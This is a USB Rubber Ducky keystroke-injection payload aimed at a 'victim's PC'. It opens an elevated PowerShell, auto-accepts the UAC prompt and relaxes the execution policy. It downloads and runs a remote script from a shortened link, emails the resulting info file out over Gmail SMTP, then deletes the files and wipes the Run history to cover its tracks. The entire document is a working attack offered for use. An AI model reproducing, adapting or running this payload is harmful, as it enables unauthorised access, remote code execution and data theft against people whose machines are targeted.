REM		-- This would be the beginning of the script. 2 second delay to allow USB to enumerate in victim's PC.
DELAY 2000
REM		-- Press Win + R to open 'Run'.
GUI R
DELAY 200
REM		-- Start Powershell as administrator (alternatively you can substitute 'CMD' if you prefer).
STRING powershell Start-Process powershell -Verb runAs
ENTER
DELAY 600
REM		-- Press 'ALT + Y' to choose 'Yes' option for UAC dialog box.
ALT y
DELAY 500
REM		-- To account for any victim with UAC disabled, cursor will shift left once and press 'DELETE' to remove lowercase 'y' from the shell.
REM		-- Any victim with UAC enabled, pressing LEFTARROW + DELETE effectively does nothing, which allows us to account for both scenarios.
LEFTARROW
DELETE
STRING Set-ExecutionPolicy unrestricted
ENTER
DELAY 500
STRING a
ENTER
DELAY 500
REM 		-- The link https://gist.githubusercontent.com/MrSnowMonster/67b473f0395f6c08b7418680de668e1f/raw/60baac1b8ba294d8f11ed3b1e15381af23632d08/just%2520for%2520my%2520own%2520testing
STRING (new-object net.webclient).DownloadFile('https://goo.gl/EFg0Lw','in.ps1')
SHIFT ENTER
STRING ./in.ps1
ENTER
DELAY 2000
ENTER
STRING Set-ExecutionPolicy restricted
ENTER
DELAY 500
STRING a
ENTER
DELAY 300
STRING $SMTPServer = 'smtp.gmail.com'
ENTER
STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
ENTER
STRING $SMTPInfo.EnableSsl = $true
ENTER

REM		-- Remember to add your email details for the script to work. change Email, PASSWORD, SENDERMAIL and RECIVERMAIL.

STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('EMAIL', 'PASSWORD')
ENTER
STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
ENTER
STRING $ReportEmail.From = 'SENDEREMAIL'
ENTER
STRING $ReportEmail.To.Add('RECIVEREMAIL')
ENTER
STRING $ReportEmail.Subject = 'Info file'
ENTER
STRING $ReportEmail.Body = (Get-Content i.txt | out-string)
ENTER
STRING $SMTPInfo.Send($ReportEmail)
ENTER
DELAY 500
STRING del i.txt
ENTER
DELAY 500
STRING del in.ps1
ENTER
DELAY 500
REM Clear the Run history and exit
STRING powershell "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue"
ENTER
DELAY 500
STRING exit
ENTER
